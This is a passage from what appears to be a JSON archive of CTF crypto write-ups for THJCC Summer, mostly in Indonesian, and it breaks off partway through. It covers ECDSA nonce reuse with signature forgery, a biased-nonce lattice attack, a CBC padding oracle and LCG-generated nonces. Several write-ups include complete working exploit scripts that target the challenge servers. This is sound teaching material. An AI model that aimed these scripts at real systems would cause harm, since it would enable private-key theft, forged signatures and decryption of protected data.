everything integral:\r\n\r\n      q_i*n + t_i*d + u_i = k_i\r\n\r\n    A short lattice vector has coordinates:\r\n      (k_1*n, ..., k_m*n, d*B, B*n)\r\n    \"\"\"\r\n    m = len(signatures)\r\n    ts, us = [], []\r\n    for sig in signatures:\r\n        r = int(sig[\"r\"], 16)\r\n        s = int(sig[\"s\"], 16)\r\n        z = sha256_int(bytes.fromhex(sig[\"msg\"]))\r\n        si = inv_mod(s, N)\r\n        ts.append((r * si) % N)\r\n        us.append((z * si) % N)\r\n\r\n    rows = []\r\n    for i in range(m):\r\n        row = [0] * (m + 2)\r\n        row[i] = N * N\r\n        rows.append(row)\r\n\r\n    rows.append([t * N for t in ts] + [B, 0])\r\n    rows.append([u * N for u in us] + [0, B * N])\r\n    return Matrix(rows), ts, us\r\n\r\n\r\ndef recover_private_key(all_sigs, qx, qy):\r\n    # 12 signatures are enough for this instance; loop makes the solver robust.\r\n    for m in [12] + list(range(13, min(31, len(all_sigs)) + 1)):\r\n        M, ts, us = build_lattice(all_sigs[:m])\r\n        R = M.lll(delta=0.99)\r\n\r\n        for vec in R.tolist():\r\n            vec = [int(x) for x in vec]\r\n            if abs(vec[-1]) != B * N:\r\n                continue\r\n            if vec[-2] % B != 0:\r\n                continue\r\n\r\n            d = (vec[-2] // B) % N\r\n            nonces = [(t * d + u) % N for t, u in zip(ts, us)]\r\n            if not all(k < B for k in nonces):\r\n                continue\r\n            if ec_mul(d) != (qx, qy):\r\n                continue\r\n            return d, m\r\n\r\n    raise RuntimeError(\"private key not recovered; try increasing the signature range\")\r\n\r\n\r\ndef main():\r\n    data = json.loads(Path(\"output.json\").read_text())\r\n    qx = int(data[\"Qx\"], 16)\r\n    qy = int(data[\"Qy\"], 16)\r\n\r\n    d, used = recover_private_key(data[\"signatures\"], qx, qy)\r\n    print(f\"[+] recovered d using {used} signatures\")\r\n    print(f\"[+] d = {d:064x}\")\r\n\r\n    enc = bytes.fromhex(data[\"flag_enc\"])\r\n    iv, ct = enc[:16], enc[16:]\r\n    key = hashlib.sha256(b\"wallet-v1|\" + d.to_bytes(32, \"big\")).digest()[:16]\r\n    pt = unpad_pkcs7(aes_cbc_decrypt(key, iv, ct))\r\n    flag = pt.decode()\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{l4tt1c3s_turn_b14s3d_n0nc3s_1nt0_pr1v4t3_k3ys}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-crypto-noncesense",
    "title": "Nonce Sense — THJCC CTF Write-up",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "* **CTF:** THJCC\n* **Challenge:** Nonce Sense\n* **Category:** Cryptography\n* **Service:** `nc chal.thjcc.org 12001`\n* **Flag:** `THJCC{n3v3r_3v3r_r3us3_th3_s4m3_n0nc3}`",
    "problemDescription": "Pada challenge ini, kita diberikan akses ke sebuah koneksi socket:\n\n```bash\nnc chal.thjcc.org 12001\n```\n\nSaat terhubung, server memberikan beberapa informasi:\n\n* `PUB`: Public key server.\n* `SIG (1)`: Signature untuk pesan `transfer 1 coin to alice`.\n* `SIG (2)`: Signature untuk pesan `transfer 2 coins to bob`.\n* `TARGET`: Pesan yang harus kita forge signature-nya, yaitu:\n\n```text\nadmin=true;action=release_flag\n```\n\nTujuannya adalah memberikan signature ECDSA yang valid untuk pesan `TARGET` sehingga server mengembalikan flag.\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "2. Identifikasi Kerentanan",
        "content": "Perhatikan dua signature yang diberikan server.\n\n### Signature 1\n\n```text\nr  = 1d582b9f128dd5a6e82fbf9232f9b8febc3945f35412de53cfa6b152cf8b4cb9\ns1 = 53b1a5659e4fc1d84a97afc9fc33eaaf59621beddfdb495dfe0ffeba9d04ef1a\n```\n\n### Signature 2\n\n```text\nr  = 1d582b9f128dd5a6e82fbf9232f9b8febc3945f35412de53cfa6b152cf8b4cb9\ns2 = e874a347d981c50230ca90851d931537adb49e28f31a38d0d6920b3fbd499c80\n```\n\nTerlihat bahwa:\n\n```text\nr1 = r2\n```\n\nPadahal kedua pesan berbeda.\n\nDalam ECDSA, nilai `r` berasal dari nonce `k`. Jika dua pesan berbeda menghasilkan `r` yang sama, hal tersebut mengindikasikan bahwa nonce yang sama telah digunakan kembali.\n\nIni merupakan kelemahan fatal pada implementasi ECDSA karena nonce reuse memungkinkan kita menghitung kembali private key.\n\n---"
      },
      {
        "title": "3. Dasar Matematis ECDSA",
        "content": "Persamaan ECDSA untuk komponen `s` adalah:\n\n$$\ns \\equiv k^{-1}(z + r \\cdot d) \\pmod n\n$$\n\ndengan:\n\n* `k` = nonce\n* `z` = hash dari pesan\n* `r, s` = komponen signature\n* `d` = private key\n* `n` = order dari elliptic curve\n\nUntuk dua signature dengan nonce yang sama:\n\n$$\ns_1 \\cdot k \\equiv z_1 + r \\cdot d \\pmod n\n$$\n\n$$\ns_2 \\cdot k \\equiv z_2 + r \\cdot d \\pmod n\n$$\n\nKurangkan kedua persamaan tersebut:\n\n$$\nk(s_1-s_2) \\equiv z_1-z_2 \\pmod n\n$$\n\nSehingga nonce dapat dihitung:\n\n$$\nk \\equiv (z_1-z_2)(s_1-s_2)^{-1} \\pmod n\n$$\n\nSetelah mendapatkan `k`, private key dapat dihitung dari:\n\n$$\nd \\equiv (s_1k-z_1)r^{-1} \\pmod n\n$$\n\nDengan demikian, kita dapat memperoleh private key server hanya dari dua signature yang diberikan.\n\n---"
      },
      {
        "title": "4. Validasi Public Key",
        "content": "Challenge tidak langsung memberi tahu curve yang digunakan. Solver dapat mencoba curve yang umum digunakan, yaitu:\n\n* NIST P-256 (`NIST256p`)\n* secp256k1 (`SECP256k1`)\n\nSetelah mendapatkan kandidat private key `d`, kita membuat public key dari private key tersebut dan membandingkan koordinat `x` dan `y` dengan public key yang diberikan server.\n\nJika keduanya sama, berarti curve dan private key yang ditemukan benar.\n\n---"
      },
      {
        "title": "5. Membuat Signature untuk TARGET",
        "content": "Setelah private key berhasil diperoleh, kita dapat membuat signature baru untuk:\n\n```text\nadmin=true;action=release_flag\n```\n\nSignature tersebut kemudian dikirim ke server dalam format:\n\n```text\nr s\n```\n\nServer akan memverifikasi signature menggunakan public key yang sama. Karena signature dibuat menggunakan private key yang valid, server menerima signature tersebut dan mengembalikan flag.\n\n---"
      },
      {
        "title": "6. Solver Script",
        "content": "Berikut solver otomatis menggunakan Python, `pwntools`, `ecdsa`, dan `pycryptodome`:\n\n```python\nfrom pwn import *\nimport hashlib\nfrom Crypto.Util.number import inverse\nfrom ecdsa import SigningKey, NIST256p, SECP256k1\n\nHOST = 'chal.thjcc.org'\nPORT = 12001\n\n\ndef solve():\n    io = remote(HOST, PORT)\n\n    # 1. Parsing data dari server\n    io.recvuntil(b\"PUB \")\n    pub_x_hex, pub_y_hex = (\n        io.recvline().decode().strip().split()\n    )\n\n    io.recvuntil(b\"SIG \")\n    msg1_hex, r1_hex, s1_hex = (\n        io.recvline().decode().strip().split()\n    )\n\n    io.recvuntil(b\"SIG \")\n    msg2_hex, r2_hex, s2_hex = (\n        io.recvline().decode().strip().split()\n    )\n\n    io.recvuntil(b\"TARGET \")\n    target_hex = io.recvline().decode().strip()\n\n    # 2. Konversi ke integer / bytes\n    r = int(r1_hex, 16)\n    s1 = int(s1_hex, 16)\n    s2 = int(s2_hex, 16)\n\n    pub_x = int(pub_x_hex, 16)\n    pub_y = int(pub_y_hex, 16)\n\n    msg1 = bytes.fromhex(msg1_hex)\n    msg2 = bytes.fromhex(msg2_hex)\n    target_msg = bytes.fromhex(target_hex)\n\n    # Hash pesan menggunakan SHA-256\n    z1 = int.from_bytes(\n        hashlib.sha256(msg1).digest(),\n        'big'\n    )\n\n    z2 = int.from_bytes(\n        hashlib.sha256(msg2).digest(),\n        'big'\n    )\n\n    log.info(\"Mengekstrak private key...\")\n\n    correct_sk = None\n\n    # 3. Coba curve yang mungkin digunakan\n    for curve_name, CURVE in [\n        (\"NIST256p\", NIST256p),\n        (\"SECP256k1\", SECP256k1)\n    ]:\n        n = CURVE.order\n\n        try:\n            # Recover nonce k\n            k = (\n                (z1 - z2)\n                * inverse(s1 - s2, n)\n            ) % n\n\n            # Recover private key d\n            d = (\n                (s1 * k - z1)\n                * inverse(r, n)\n            ) % n\n\n            # Generate public key dari private key\n            sk = SigningKey.from_secret_exponent(\n                d,\n                curve=CURVE\n            )\n\n            vk = sk.get_verifying_key()\n\n            # Validasi terhadap public key server\n            if (\n                vk.pubkey.point.x() == pub_x\n                and\n                vk.pubkey.point.y() == pub_y\n            ):\n                log.success(\n                    f\"Kurva yang benar: {curve_name}\"\n                )\n\n                log.success(\n                    f\"Private key: {hex(d)}\"\n                )\n\n                correct_sk = sk\n                break\n\n        except Exception:\n            continue\n\n    if not correct_sk:\n        log.error(\"Gagal mengekstrak private key.\")\n        return\n\n    # 4. Buat signature untuk TARGET\n    sig_target = correct_sk.sign_deterministic(\n        target_msg,\n        hashfunc=hashlib.sha256\n    )\n\n    r_target = sig_target[:32].hex()\n    s_target = sig_target[32:].hex()\n\n    # 5. Kirim signature ke server\n    payload = f\"{r_target} {s_target}\".encode()\n\n    log.info(\"Mengirim signature untuk TARGET...\")\n\n    io.sendline(payload)\n    io.interactive()\n\n\nif __name__ == \"__main__\":\n    solve()\n```\n\n> **Catatan:** Pemotongan `sig_target[:32]` dan `sig_target[32:]` mengasumsikan signature yang dihasilkan library berada dalam format raw `r || s`, masing-masing 32 byte. Jika implementasi challenge menggunakan format signature berbeda, gunakan encoder/decoder ECDSA yang sesuai.\n\n---"
      },
      {
        "title": "7. Exploit Flow",
        "content": "Secara singkat, exploit bekerja seperti berikut:\n\n```text\n              SIG 1                  SIG 2\n                │                      │\n                │      r1 = r2        │\n                └──────────┬───────────┘\n                           │\n                    Nonce Reuse\n                           │\n                           ▼\n                  Recover nonce k\n                           │\n                           ▼\n                Recover private key d\n                           │\n                           ▼\n                  Validate dengan PUB\n                           │\n                           ▼\n             Sign pesan TARGET\n                           │\n                           ▼\n                 Kirim r_target, s_target\n                           │\n                           ▼\n                         FLAG\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nimport hashlib\r\nfrom Crypto.Util.number import inverse\r\nfrom ecdsa import SigningKey, NIST256p, SECP256k1\r\n\r\nHOST = 'chal.thjcc.org'\r\nPORT = 12001\r\n\r\ndef solve():\r\n    io = remote(HOST, PORT)\r\n    \r\n    # 1. Parsing data dari server\r\n    io.recvuntil(b\"PUB \")\r\n    pub_x_hex, pub_y_hex = io.recvline().decode().strip().split()\r\n    \r\n    io.recvuntil(b\"SIG \")\r\n    msg1_hex, r1_hex, s1_hex = io.recvline().decode().strip().split()\r\n    \r\n    io.recvuntil(b\"SIG \")\r\n    msg2_hex, r2_hex, s2_hex = io.recvline().decode().strip().split()\r\n    \r\n    io.recvuntil(b\"TARGET \")\r\n    target_hex = io.recvline().decode().strip()\r\n    \r\n    # Konversi ke Integer / Bytes\r\n    r = int(r1_hex, 16)\r\n    s1 = int(s1_hex, 16)\r\n    s2 = int(s2_hex, 16)\r\n    pub_x = int(pub_x_hex, 16)\r\n    pub_y = int(pub_y_hex, 16)\r\n    \r\n    msg1 = bytes.fromhex(msg1_hex)\r\n    msg2 = bytes.fromhex(msg2_hex)\r\n    target_msg = bytes.fromhex(target_hex)\r\n    \r\n    z1 = int.from_bytes(hashlib.sha256(msg1).digest(), 'big')\r\n    z2 = int.from_bytes(hashlib.sha256(msg2).digest(), 'big')\r\n    \r\n    log.info(\"Mencari Kurva yang tepat dan mengekstrak Private Key...\")\r\n    \r\n    correct_sk = None\r\n    \r\n    # 2. Coba kedua Kurva secara otomatis\r\n    for curve_name, CURVE in [(\"NIST256p\", NIST256p), (\"SECP256k1\", SECP256k1)]:\r\n        n = CURVE.order\r\n        try:\r\n            # Mencari k dan d\r\n            k = ((z1 - z2) * inverse(s1 - s2, n)) % n\r\n            d = ((s1 * k - z1) * inverse(r, n)) % n\r\n            \r\n            # Buat instance key dan derive Public Key-nya\r\n            sk = SigningKey.from_secret_exponent(d, curve=CURVE)\r\n            vk = sk.get_verifying_key()\r\n            \r\n            # VERIFIKASI: Apakah d kita menghasilkan PUB yang sama dengan server?\r\n            if vk.pubkey.point.x() == pub_x and vk.pubkey.point.y() == pub_y:\r\n                log.success(f\"Kurva yang benar ditemukan: {curve_name}\")\r\n                log.success(f\"Private Key tervalidasi 100% Benar: {hex(d)}\")\r\n                correct_sk = sk\r\n                break\r\n        except Exception as e:\r\n            continue\r\n            \r\n    if not correct_sk:\r\n        log.error(\"Gagal mengekstrak Private Key. Periksa metode perhitungan.\")\r\n        return\r\n\r\n    # 3. Buat Tanda Tangan untuk TARGET\r\n    sig_target = correct_sk.sign_deterministic(target_msg, hashfunc=hashlib.sha256)\r\n    r_target = sig_target[:32].hex()\r\n    s_target = sig_target[32:].hex()\r\n    \r\n    # 4. Kirim Payload\r\n    # Default kita coba pisah dengan spasi\r\n    payload = f\"{r_target} {s_target}\".encode()\r\n    log.info(f\"Mengirim payload: {payload}\")\r\n    \r\n    io.sendline(payload)\r\n    io.interactive()\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{n3v3r_3v3r_r3us3_th3_s4m3_n0nc3}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-crypto-oracleofpadding",
    "title": "Oracle of Padding",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Oracle of Padding",
    "problemDescription": "",
    "tools": [],
    "analysis": "Ketika konek ke server, token yang diberikan memiliki panjang 112 byte setelah di-decode dari hex. Karena 112 merupakan kelipatan 16, token ini kemungkinan besar adalah ciphertext berbasis block cipher, seperti AES-CBC.\n\nStrukturnya diasumsikan sebagai:\n\n```text\nIV || C1 || C2 || C3 || ...\n```\n\nDengan ukuran blok 16 byte.\n\nSaat mencoba mengirim ciphertext yang dimodifikasi ke server, server memberikan respons seperti:\n\n```text\nBAD\n```\n\nRespons ini muncul ketika padding ciphertext tidak valid. Artinya, server membocorkan informasi apakah padding hasil dekripsi valid atau tidak.\n\nDari sini dapat disimpulkan bahwa challenge ini rentan terhadap **Padding Oracle Attack**.\n\n### Vulnerability\n\nPada mode CBC, plaintext sebuah blok dihitung dengan rumus:\n\n```text\nP_i = D(C_i) XOR C_{i-1}\n```\n\nJika kita ingin mendekripsi suatu blok `C_i`, kita dapat memodifikasi blok sebelumnya `C_{i-1}`. Server akan mencoba mendekripsi ciphertext tersebut dan memberi tahu apakah padding hasil dekripsi valid.\n\nKarena server membedakan padding valid dan tidak valid melalui respons `BAD`, kita bisa melakukan brute force byte per byte untuk mendapatkan nilai intermediate:\n\n```text\nI_i = D(C_i)\n```\n\nSetelah intermediate ditemukan, plaintext asli dapat dihitung dengan:\n\n```text\nP_i = I_i XOR C_{i-1 asli}\n```\n\nAttack dilakukan dari byte paling belakang blok menuju byte paling depan, sesuai aturan PKCS#7 padding.",
    "solution": [
      {
        "title": "Category",
        "content": "Crypto"
      },
      {
        "title": "Challenge",
        "content": "Diberikan sebuah service:\n\n```bash\nnc chal.thjcc.org 12000\n````\n\nSaat terkoneksi, server memberikan sebuah token hex:\n\n```text\nTOKEN <hex>\n```\n\nTidak ada file tambahan yang diberikan, sehingga analisis dilakukan langsung dari interaksi dengan service."
      },
      {
        "title": "Exploit",
        "content": "Exploit dibuat menggunakan `pwntools`. Script mengambil token dari server, memecahnya menjadi blok 16 byte, lalu mendekripsi setiap blok menggunakan padding oracle.\n\nBagian penting dari prosesnya adalah mengirim payload:\n\n```text\nfake_iv || target_block\n```\n\nJika respons server bukan `BAD`, maka padding dianggap valid dan byte intermediate dapat dihitung.\n\nScript juga melakukan pengecekan false positive untuk byte terakhir, karena padding `0x01` kadang bisa menghasilkan kandidat palsu.\n\n```python\nfrom pwn import *\nimport sys\n\nHOST = 'chal.thjcc.org'\nPORT = 12000\nBLOCK_SIZE = 16\n\ndef check_padding(r, payload):\n    try:\n        r.sendline(payload.hex().encode())\n        response = r.recvline().decode('utf-8').strip()\n\n        if \"BAD\" in response:\n            return False\n\n        return True\n\n    except EOFError:\n        log.error(\"Koneksi terputus.\")\n        return False\n\ndef decrypt_block(r, iv, block):\n    intermediate = bytearray(BLOCK_SIZE)\n    plaintext = bytearray(BLOCK_SIZE)\n\n    for i in range(BLOCK_SIZE - 1, -1, -1):\n        padding_val = BLOCK_SIZE - i\n        match_found = False\n\n        for guess in range(256):\n            fake_iv = bytearray(BLOCK_SIZE)\n\n            for j in range(BLOCK_SIZE - 1, i, -1):\n                fake_iv[j] = intermediate[j] ^ padding_val\n\n            fake_iv[i] = guess\n            payload = bytes(fake_iv) + block\n\n            if check_padding(r, payload):\n                if i == 15:\n                    fake_iv[14] ^= 0xFF\n                    payload_check = bytes(fake_iv) + block\n\n                    if not check_padding(r, payload_check):\n                        continue\n\n                intermediate[i] = guess ^ padding_val\n                plaintext[i] = iv[i] ^ intermediate[i]\n\n                char_found = chr(plaintext[i]) if 32 <= plaintext[i] <= 126 else f\"\\\\x{plaintext[i]:02x}\"\n                log.info(f\"Byte [{i:02d}] ditemukan: {char_found}\")\n\n                match_found = True\n                break\n\n        if not match_found:\n            log.error(f\"Gagal mencari byte ke-{i}.\")\n            return None\n\n    return bytes(plaintext)\n\ndef main():\n    context.log_level = 'info'\n\n    r = remote(HOST, PORT)\n\n    r.recvuntil(b'TOKEN ')\n    token_hex = r.recvline().strip().decode()\n    log.success(f\"Token didapatkan: {token_hex}\")\n\n    token_bytes = bytes.fromhex(token_hex)\n\n    if len(token_bytes) % BLOCK_SIZE != 0:\n        log.error(\"Panjang token bukan kelipatan 16.\")\n        sys.exit(1)\n\n    blocks = [\n        token_bytes[i:i + BLOCK_SIZE]\n        for i in range(0, len(token_bytes), BLOCK_SIZE)\n    ]\n\n    log.info(f\"Total blok: {len(blocks)}. Blok pertama adalah IV.\")\n\n    plaintext = b''\n\n    for b in range(1, len(blocks)):\n        log.info(f\"--- Memulai dekripsi blok {b} ---\")\n\n        iv = blocks[b - 1]\n        block = blocks[b]\n\n        decrypted_block = decrypt_block(r, iv, block)\n\n        if decrypted_block is None:\n            r.close()\n            sys.exit(1)\n\n        plaintext += decrypted_block\n\n        readable = ''.join(chr(x) for x in plaintext if 32 <= x <= 126)\n        log.success(f\"Plaintext sejauh ini: {readable}\")\n\n    log.success(f\"Plaintext akhir: {plaintext.decode(errors='ignore')}\")\n    r.close()\n\nif __name__ == '__main__':\n    main()\n```"
      },
      {
        "title": "Hasil",
        "content": "Setelah seluruh blok berhasil didekripsi, plaintext yang didapat adalah JSON:\n\n```json\n{\"user\":\"guest\",\"admin\":false,\"note\":\"THJCC{p4dd1ng_0r4cl3s_l34k_0n3_byt3_p3r_qu3ry}\"}\n```\n\nPada blok terakhir juga terdapat padding PKCS#7 berupa byte `0x0a`, sehingga bagian tersebut diabaikan."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nimport sys\r\n\r\n# Konfigurasi target\r\nHOST = 'chal.thjcc.org'\r\nPORT = 12000\r\nBLOCK_SIZE = 16\r\n\r\ndef check_padding(r, payload):\r\n    \"\"\"\r\n    Mengirim tebakan ke server dan mengecek validitas padding.\r\n    \"\"\"\r\n    try:\r\n        # Kirim payload hex langsung (tanpa menunggu prompt)\r\n        r.sendline(payload.hex().encode())\r\n        \r\n        # Baca balasan server\r\n        response = r.recvline().decode('utf-8').strip()\r\n        \r\n        # Jika balasan adalah \"BAD\", berarti padding salah\r\n        if \"BAD\" in response:\r\n            return False\r\n            \r\n        # Jika balasan BUKAN \"BAD\" (misal: \"OK\", pesan sukses, atau flag), padding valid\r\n        return True\r\n        \r\n    except EOFError:\r\n        # Jika server memutus koneksi tiba-tiba\r\n        log.error(\"Koneksi terputus! Server mungkin menutup koneksi setelah padding salah.\")\r\n        # Jika ini terus terjadi, script membutuhkan arsitektur reconnect-per-byte,\r\n        # tapi umumnya CTF membiarkan koneksi tetap hidup selama panjang input valid.\r\n        return False\r\n\r\ndef decrypt_block(r, iv, block):\r\n    intermediate = bytearray(BLOCK_SIZE)\r\n    plaintext = bytearray(BLOCK_SIZE)\r\n    \r\n    # Tebak dari byte ke-15 mundur ke byte ke-0\r\n    for i in range(BLOCK_SIZE - 1, -1, -1):\r\n        padding_val = BLOCK_SIZE - i\r\n        match_found = False\r\n        \r\n        # Iterasi dari 0x00 sampai 0xFF\r\n        for guess in range(256):\r\n            fake_iv = bytearray(BLOCK_SIZE)\r\n            \r\n            # Setel byte yang sudah ditebak sebelumnya\r\n            for j in range(BLOCK_SIZE - 1, i, -1):\r\n                fake_iv[j] = intermediate[j] ^ padding_val\r\n                \r\n            fake_iv[i] = guess\r\n            payload = bytes(fake_iv) + block\r\n            \r\n            if check_padding(r, payload):\r\n                # Validasi False Positive untuk byte terakhir (byte ke-15)\r\n                if i == 15:\r\n                    fake_iv[14] ^= 0xFF\r\n                    payload_check = bytes(fake_iv) + block\r\n                    if not check_padding(r, payload_check):\r\n                        continue # False positive, lanjut ke tebakan berikutnya\r\n                \r\n                # Intermediate byte ditemukan\r\n                intermediate[i] = guess ^ padding_val\r\n                plaintext[i] = iv[i] ^ intermediate[i]\r\n                \r\n                char_found = chr(plaintext[i]) if 32 <= plaintext[i] <= 126 else f\"\\\\x{plaintext[i]:02x}\"\r\n                log.info(f\"Byte [{i:02d}] ditemukan: {char_found}\")\r\n                \r\n                match_found = True\r\n                break\r\n                \r\n        if not match_found:\r\n            log.error(f\"Gagal mencari byte ke-{i}. Terjadi kesalahan logika atau koneksi.\")\r\n            return None\r\n            \r\n    return bytes(plaintext)\r\n\r\ndef main():\r\n    # Mengatur log pwntools\r\n    context.log_level = 'info'\r\n    \r\n    log.info(f\"Menyambungkan ke {HOST}:{PORT}...\")\r\n    r = remote(HOST, PORT)\r\n    \r\n    # Ambil token (Ciphertext awal)\r\n    r.recvuntil(b'TOKEN ')\r\n    token_hex = r.recvline().strip().decode('utf-8')\r\n    log.success(f\"Token didapatkan: {token_hex}\")\r\n    \r\n    token_bytes = bytes.fromhex(token_hex)\r\n    \r\n    # Validasi panjang ciphertext (harus kelipatan 16)\r\n    if len(token_bytes) % BLOCK_SIZE != 0:\r\n        log.error(\"Panjang token tidak sesuai standar blok AES (bukan kelipatan 16).\")\r\n        sys.exit(1)\r\n        \r\n    # Pecah token menjadi blok-blok berukuran 16 byte\r\n    blocks = [token_bytes[i:i+BLOCK_SIZE] for i in range(0, len(token_bytes), BLOCK_SIZE)]\r\n    log.info(f\"Total blok: {len(blocks)} (Blok 0 adalah IV)\")\r\n    \r\n    flag = b''\r\n    \r\n    # Loop dekripsi untuk setiap blok ciphertext\r\n    for b in range(1, len(blocks)):\r\n        log.info(f\"\\n--- Memulai dekripsi Blok {b} dari {len(blocks)-1} ---\")\r\n        iv = blocks[b-1]\r\n        block = blocks[b]\r\n        \r\n        decrypted_block = decrypt_block(r, iv, block)\r\n        \r\n        if decrypted_block is None:\r\n            log.error(\"Eksploitasi terhenti.\")\r\n            r.close()\r\n            sys.exit(1)\r\n            \r\n        flag += decrypted_block\r\n        \r\n        # Filter karakter non-printable (biasanya ini adalah hasil padding bytes)\r\n        readable_text = ''.join([chr(b) for b in flag if 32 <= b <= 126])\r\n        log.success(f\"Plaintext sejauh ini: {readable_text}\")\r\n\r\n    log.success(f\"\\n[+] EKSPLOITASI SELESAI. FLAG: {flag.decode('utf-8', errors='ignore')}\")\r\n    r.close()\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{p4dd1ng_0r4cl3s_l34k_0n3_byt3_p3r_qu3ry}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-crypto-schizophrenicsigner",
    "title": "CTF Writeup: Schizophrenic Signer",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge CTF Writeup: Schizophrenic Signer",
    "problemDescription": "Pada tantangan kriptografi **\"Schizophrenic Signer\"**, kita diberikan akses ke sebuah layanan yang menghasilkan tanda tangan digital ECDSA menggunakan kurva eliptik. Kita diberikan parameter *public key*, *generator params* (nilai `a` dan `b`), serta sejumlah besar tanda tangan digital (`h`, `r`, `s`). Tujuan akhirnya adalah menemukan *Private Key* (`d`).\n\nPetunjuk utama dari tantangan ini adalah kalimat:\n\n> \"讓隨機數在兩個不同的世界中反覆跳躍\"\n\nyang kurang lebih berarti *\"Biarkan angka acak melompat berulang kali di antara dua dunia berbeda\"*.\n\nString flag yang akhirnya ditemukan adalah:\n\n```text\nTHJCC{w0w_y0u_f0und_th3_h1dd3n_d3lt4_b3tw33n_p_4nd_q!}\n```\n\n---",
    "tools": [],
    "analysis": "Dalam sistem ECDSA, setiap tanda tangan menggunakan sebuah *nonce* (`k`). Pada implementasi yang aman, `k` seharusnya dihasilkan menggunakan sumber randomness kriptografis yang kuat.\n\nPada challenge ini, `k` justru dihasilkan menggunakan **Linear Congruential Generator (LCG)**.\n\nCacat utama muncul karena state LCG berjalan pada modulus prime kurva `p`, sedangkan ECDSA bekerja pada modulus order grup `n`.\n\n### Dunia 1 — Prime Field, Modulo `p`\n\nState PRNG diperbarui menggunakan:\n\n$$\nk_{i+1} \\equiv a \\cdot k_i + b \\pmod p\n$$\n\n### Dunia 2 — Scalar Field, Modulo `n`\n\nECDSA menggunakan hubungan:\n\n$$\ns_i \\equiv k_i^{-1}(h_i+r_i d)\\pmod n\n$$\n\nSehingga:\n\n$$\nk_i \\equiv s_i^{-1}h_i+s_i^{-1}r_i d\\pmod n\n$$\n\nKarena nilai `k` yang sama digunakan oleh kedua sistem, kita dapat menghubungkan kedua dunia tersebut.\n\n---",
    "solution": [
      {
        "title": "1. Eliminasi Private Key dari Modulo `n`",
        "content": "Definisikan:\n\n$$\nA_i=s_i^{-1}h_i\\pmod n\n$$\n\ndan:\n\n$$\nB_i=s_i^{-1}r_i\\pmod n\n$$\n\nMaka persamaan ECDSA menjadi:\n\n$$\nk_i\\equiv A_i+B_i d\\pmod n\n$$\n\nUntuk signature pertama:\n\n$$\nd\\equiv B_0^{-1}(k_0-A_0)\\pmod n\n$$\n\nSubstitusikan persamaan tersebut ke signature lainnya:\n\n$$\nk_i\\equiv A_i+B_iB_0^{-1}(k_0-A_0)\\pmod n\n$$\n\nDengan:\n\n$$\nu_i=B_iB_0^{-1}\\pmod n\n$$\n\ndan:\n\n$$\nv_i=A_i-u_iA_0\\pmod n\n$$\n\nkita memperoleh:\n\n$$\nk_i\\equiv u_i k_0+v_i\\pmod n\n$$\n\nDengan demikian, seluruh nonce `k_i` dapat direpresentasikan berdasarkan satu variabel, yaitu `k_0`.\n\n---"
      },
      {
        "title": "2. Ekspansi LCG pada Modulo `p`",
        "content": "LCG memiliki bentuk:\n\n$$\nk_{i+1}\\equiv ak_i+b\\pmod p\n$$\n\nBeberapa iterasi pertama:\n\n$$\nk_1\\equiv ak_0+b\\pmod p\n$$\n\n$$\nk_2\\equiv a^2k_0+ab+b\\pmod p\n$$\n\nSecara umum:\n\n$$\nk_i\\equiv U_i k_0+V_i\\pmod p\n$$\n\ndengan:\n\n$$\nU_i=a^i\\pmod p\n$$\n\ndan:\n\n$$\nV_i=\\sum_{j=0}^{i-1}a^jb\\pmod p\n$$\n\nJadi, dari sisi LCG, `k_i` juga dapat ditulis sebagai fungsi linear terhadap `k_0`.\n\n---"
      },
      {
        "title": "3. Menggabungkan Kedua Dunia dengan CRT",
        "content": "Sekarang kita memiliki dua persamaan untuk nonce yang sama:\n\n$$\nk_i\\equiv u_i k_0+v_i\\pmod n\n$$\n\ndan:\n\n$$\nk_i\\equiv U_i k_0+V_i\\pmod p\n$$\n\nKarena:\n\n$$\n\\gcd(n,p)=1\n$$\n\nkedua persamaan tersebut dapat digabungkan menggunakan **Chinese Remainder Theorem (CRT)**.\n\nKita mencari `C_i` dan `D_i` sehingga:\n\n$$\nC_i\\equiv u_i\\pmod n\n$$\n\n$$\nC_i\\equiv U_i\\pmod p\n$$\n\nserta:\n\n$$\nD_i\\equiv v_i\\pmod n\n$$\n\n$$\nD_i\\equiv V_i\\pmod p\n$$\n\nDengan modulus gabungan:\n\n$$\nM=n\\cdot p\n$$\n\nmaka diperoleh:\n\n$$\nk_i\\equiv C_i k_0+D_i\\pmod M\n$$\n\natau:\n\n$$\nk_i-C_i k_0-D_i\\equiv0\\pmod M\n$$\n\nPersamaan inilah yang kemudian dimanfaatkan untuk membangun lattice.\n\n---"
      },
      {
        "title": "4. Lattice Reduction dengan LLL",
